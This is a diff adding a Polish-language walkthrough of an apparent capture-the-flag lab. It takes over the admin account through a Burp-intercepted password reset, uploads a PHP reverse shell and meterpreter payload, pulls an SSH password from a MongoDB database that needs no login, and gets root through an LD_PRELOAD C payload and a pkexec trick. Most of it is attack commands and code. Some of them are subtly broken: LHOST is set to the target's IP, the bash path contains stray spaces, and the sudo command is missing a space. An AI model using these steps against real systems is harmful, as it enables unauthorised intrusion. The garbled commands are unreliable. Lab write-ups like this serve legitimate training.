@@ -1,0 +1,257 @@
+Logowanie za pomoca BurpSuite oraz anonimowe logowanie dzięki Mongo
+
+*Enumeracja za pomoca nmap:*
+```python
+sudo nmap -sS -sV -sC --top-ports 65535 --min-rate 1500 10.10.102.254
+
+Nmap scan report for 10.10.102.254
+Host is up (0.051s latency).
+Not shown: 8349 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 e6:dc:88:69:de:a1:73:8e:84:5b:a1:3e:27:9f:07:24 (RSA)
+|   256 6b:ea:18:5d:8d:c7:9e:9a:01:2c:dd:50:c5:f8:c8:05 (ECDSA)
+|_  256 ef:06:d7:e4:b1:65:15:6e:94:62:cc:dd:f0:8a:1a:24 (ED25519)
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+|_http-title: Sky Couriers
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+```
+
+*Otwarte porty:*
+```python
+22/tcp
+80/tcp
+```
+
+*W przeglądarce internetowej Burpsuite:*
+```python
+http://10.10.102.254:80
+```
+
+Merchant Central
+
+Ta strona ma funkcję rejestracji. 
+Ponieważ nie mam żadnych poświadczeń, zarejestrowałem się.
+
+Należy wpisać swój identyfikator email jako nazwę użytkownika.
+
+10 digit mobile no:
+1234567890
+
+Profil z rozwijanego menu w prawym górnym rogu, 
+Stronę edycji profilu
+Istnieje funkcja przesyłania obrazu profilowego, 
+ale dostępna jest tylko dla administratora. 
+Identyfikator e-mail administratora - admin@sky.thm
+
+*Uruchomienie narzędzia BurpSuit:*
+```python
+Proxy
+Intercept is on
+```
+
+*Funkcja zmiany hasła bieżącego użytkownika:*
+```python
+W menu
+Users
+ResetUsers
+Zmiana hasła i przekazanie prośby Submit w Burpsuite.
+
+Zmiana nazwy użytkownika na admin@sky.thm:
+```
+
+*W BurpSuit:*
+```python
+Zaznaczyć tekst z hasłem:
+123
+WebKitFormBoundaryyIzh5hqCVlLtgxR3
+
+Prawym przyciskiem myszki na tym tekście
+Send to Repeater
+
+Proxy off
+```
+
+*Skopiować:*
+```python
+admin@sky.thm 
+```
+
+*W BurpSuite:*
+```python
+Repeater
+Zamienić login i hasło na nowe
+Send
+```
+
+
+*Na stronie:*
+Wylogować się i zalogować się ponownie
+Mam uprawnienia admina!!!
+
+
+**Teraz należy utworzyć odwrotną powłokę z odpowiednimi ustawieniami 
+i wyeksportować ją w pliku.shell.php**
+
+*Kali Linux:*
+```python
+cp /usr/share/webshells/php/php-reverse-shell.php shell.php
+```
+
+Zmiana na IP Kali Linux
+
+*Kali Linux:*
+```python
+nc -nvlp 5555
+```
+
+*W Przeglądarce:*
+```python
+http://10.10.102.254/v2/profileimages/shell.php
+```
+
+lub
+
+*msfconsole:*
+```python
+use payload/php/meterpreter/reverse_tcp
+set LHOST 10.10.102.254
+generate -f raw -o shell.php
+```
+
+Teraz należy rześłać plik za pomocą aktualizacji profilu 
+w ustawieniach administratora.
+Chose File
+Edit Profile
+Pojawi się komunikat "Obraz zapisany".
+
+*W źródle strony należy poszukać ścieżki do zdjęc profilowych:*
+```python
+v2/profileimages/shell.php
+```
+
+
+*W Przeglądarce:*
+```python
+http://10.10.102.254/v2/profileimages/shell.php
+```
+
+*msfconsole:*
+```python
+use exploit/multi/handler
+set payload php/meterpreter/reverse_tcp
+set LHOST 10.10.102.254
+set LPORT 4444
+run
+```
+
+*Uzyskałem dostęp do użytkownika www.data*
+```python
+cd /home/webdeveloper
+cat user.txt
+Flaga: 63191e4ece37523c9fe6bb62a5e64d45
+```
+
+**Znalazłem /etc/mongod.conf**
+
+*Anonimowe logowanie:*
+```python
+mongo
+show databases
+use backup
+show collecions
+db.user.find()
+```
+
+Widać hasło dla użytkownika webdeveloper: BahamasChapp123!@#
+
+*Logowanie:*
+```python
+ssh webdeveloper@10.10.102.254
+password: BahamasChapp123!@#
+```
+
+*Eskalacja uprawnień*
+
+```python
+sudo -l
+(ALL : ALL) NOPASSWD: /usr/bin/sky_backup_utility
+Developer może działać bez hasła.
+```
+
+*Teraz należy użyć dwóch wyświetlanych informacji:*
+```python
+LD_PRELOAD 
+i 
+/usr/bin/sky_backup_utility.
+```
+
+Plik binarny umożliwia tworzenie kopii zapasowych z prawami roota. 
+LD_PRELOAD umożliwia ładowanie bibliotek udostępnionych 
+podczas ładowania programu.
+
+```python
+vim shell.c
+Kod:
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+void _init () {
+ unsetenv ("LD_PRELOAD");
+ setgid (0);
+ setuid (0);
+ system ("/ bin / bash");
+}
+```
+
+*Polecenie do skompilowania:*
+```python
+gcc -fPIC -shared -o shell.so shell.c -nostartfiles
+```
+
+*Polecenie rootowania pola:*
+```python
+sudo LD_PRELOAD=/tmp/shell.so/usr/bin/sky_backup_utility
+```
+
+password: BahamasChapp123!@#
+
+**Mam roota!!!**
+
+```python
+cat root.txt
+Flaga: 3a62d897c40a815ecbe267df2f533ac6
+```
+
+
+
+**Inny sposób:**
+```python
+find / -perm -u=s 2>/dev/null
+```
+
+```python
+cat /etc/polkit-l/localauthority.conf.d/51-ubuntu-admin.conf
+```
+
+*Stworzenie dwóch sesji użytkownika webdeveloper:*
+W pierwszej sesji: 
+aby uzyskać bieżący PID
+```python
+echo $$
+```
+Pojawi się PID który należy skopiować do drugiej sesji.
+
+W drugiej sesji:
+```python
+pkttyagent --process <PID>
+```
+
+W pierwszej sesji:
+```python
+pkexec /bin/bash
+```
+
+**password:** BahamasChapp123!@#
